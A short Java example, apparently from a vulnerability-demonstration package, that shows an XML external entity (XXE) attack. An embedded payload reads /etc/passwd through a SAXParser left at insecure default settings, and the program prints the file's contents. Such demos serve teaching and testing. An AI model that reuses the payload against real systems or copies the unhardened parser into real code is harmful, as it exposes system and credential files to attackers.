package com.govuln.xxe;

import org.xml.sax.helpers.DefaultHandler;

import javax.xml.parsers.SAXParser;
import javax.xml.parsers.SAXParserFactory;
import java.io.ByteArrayInputStream;

public class SAXParserExample {
    public static void main(String[] args) throws Exception {
        String data = "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?>\n" +
                "<!DOCTYPE foo [\n" +
                "   <!ENTITY xxe SYSTEM \"file:///etc/passwd\" > ]>\n" +
                "<foo>&xxe;</foo>";
        SAXParser parser = SAXParserFactory.newInstance().newSAXParser();

        parser.parse(new ByteArrayInputStream(data.getBytes()), new DefaultHandler() {
            public void characters(char[] ch, int start, int length) {
                System.out.print(new String(ch, start, length));
            }
        });
    }
}
